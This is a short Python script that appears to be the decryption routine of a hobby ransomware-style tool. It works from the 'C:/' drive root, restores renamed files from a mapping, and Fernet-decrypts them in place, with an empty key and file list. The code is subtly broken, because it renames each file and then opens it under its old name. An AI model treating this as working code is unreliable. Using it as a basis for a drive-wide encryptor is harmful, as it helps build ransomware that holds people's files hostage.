import os
from cryptography.fernet import Fernet


files_dict = {}
files = []
os.chdir("C:/")

secret_key = ""


def decrypt():
    for _ in files:
        if _ == '.DS_Store':
            continue

        if _ in files_dict:
            os.rename(_, files_dict[_])

        with open(_, "rb") as the_file:
            contents = the_file.read()

        contents_decrypted = Fernet(secret_key).decrypt(contents)

        with open(_, "wb") as the_file:
            the_file.write(contents_decrypted)
